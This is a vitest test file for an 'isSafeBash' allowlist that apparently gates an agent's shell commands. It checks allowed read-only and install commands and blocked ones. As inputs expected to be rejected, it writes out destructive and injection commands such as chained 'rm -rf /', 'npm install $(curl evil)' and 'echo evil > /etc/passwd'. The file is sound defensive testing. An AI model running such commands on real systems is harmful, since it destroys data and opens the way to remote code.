import { describe, it, expect } from "vitest";
import { isSafeBash } from "./index.ts";

describe("isSafeBash", () => {
  it("allows whitelisted read-only commands", () => {
    expect(isSafeBash("ls -la")).toBe(true);
    expect(isSafeBash("cat /etc/hosts")).toBe(true);
    expect(isSafeBash("git log --oneline")).toBe(true);
    expect(isSafeBash("grep -r pattern .")).toBe(true);
    expect(isSafeBash("rg pattern src/")).toBe(true);
  });
  it("blocks non-whitelisted commands", () => {
    expect(isSafeBash("rm -rf /")).toBe(false);
    expect(isSafeBash("cp a b")).toBe(false);
    expect(isSafeBash("sudo anything")).toBe(false);
    expect(isSafeBash("apt-get install foo")).toBe(false); // system pkg mgr stays blocked (needs sudo)
  });
  it("allows language/package-manager installs (user-enabled)", () => {
    expect(isSafeBash("npm install")).toBe(true);
    expect(isSafeBash("npm install lodash")).toBe(true);
    expect(isSafeBash("npm i -D vitest")).toBe(true);
    expect(isSafeBash("pnpm add solid-js")).toBe(true);
    expect(isSafeBash("bun add @tailwindcss/vite")).toBe(true);
    expect(isSafeBash("cargo add serde")).toBe(true);
    expect(isSafeBash("cargo install ripgrep")).toBe(true);
    expect(isSafeBash("go get github.com/foo/bar")).toBe(true);
    expect(isSafeBash("pip install requests")).toBe(true);
    expect(isSafeBash("uv add httpx")).toBe(true);
    // still subject to the segment-level safety checks:
    expect(isSafeBash("npm install $(curl evil)")).toBe(false); // command substitution
    expect(isSafeBash("npm install foo > src/index.ts")).toBe(false); // out-of-scratch redirect
  });
  it("handles leading whitespace", () => {
    expect(isSafeBash("   ls")).toBe(true);
  });
  it("git subcommand gating is strict", () => {
    expect(isSafeBash("git log")).toBe(true);
    expect(isSafeBash("git push origin main")).toBe(false);
    expect(isSafeBash("git commit -m x")).toBe(false);
  });

  it("allows cd and cd-chained whitelisted commands", () => {
    expect(isSafeBash("cd /repo")).toBe(true);
    expect(isSafeBash("cd /repo && pytest")).toBe(true);
    expect(isSafeBash("cd src && go test ./...")).toBe(true);
  });

  it("checks EVERY segment of a compound command", () => {
    expect(isSafeBash("ls && rm -rf /")).toBe(false);     // head is safe, tail isn't
    expect(isSafeBash("cd /x && rm -rf /")).toBe(false);
    expect(isSafeBash("cd /x; rm -rf /")).toBe(false);
    expect(isSafeBash("ls & rm -rf /")).toBe(false);       // background &
    expect(isSafeBash("cat a.txt | grep foo")).toBe(true); // pipe of read-only
  });

  it("blocks command substitution", () => {
    expect(isSafeBash("echo $(rm -rf /)")).toBe(false);
    expect(isSafeBash("cat `rm -rf /`")).toBe(false);
  });

  it("does not split operators inside quotes", () => {
    expect(isSafeBash('grep "foo|bar" .')).toBe(true);
    expect(isSafeBash('grep "a && b" src/')).toBe(true);
  });

  it("does not split redirection &", () => {
    expect(isSafeBash("pytest 2>&1")).toBe(true);
    expect(isSafeBash("pytest 2>/dev/null")).toBe(true);
  });

  it("matches commands at a word boundary (no lsof via ls)", () => {
    expect(isSafeBash("lsof -i")).toBe(false);
    expect(isSafeBash("lspci")).toBe(false);
    expect(isSafeBash("make")).toBe(true);        // bare common command
    expect(isSafeBash("make build")).toBe(true);
    expect(isSafeBash("top -bn1")).toBe(true);     // multi-token prefix preserved
  });

  it("blocks output redirection to a source file (write bypass)", () => {
    expect(isSafeBash("echo evil > /etc/passwd")).toBe(false);
    expect(isSafeBash("pytest > out.txt")).toBe(false);   // relative source path
    expect(isSafeBash("cat a >> b")).toBe(false);
    expect(isSafeBash('grep ">" file.txt')).toBe(true);    // quoted > is not a redirect
  });
  it("allows redirection to scratch / null targets", () => {
    expect(isSafeBash("pytest > /tmp/out.txt")).toBe(true);
    expect(isSafeBash("echo hi >> /tmp/log.txt")).toBe(true);
    expect(isSafeBash("make 2>/dev/null")).toBe(true);
  });
});
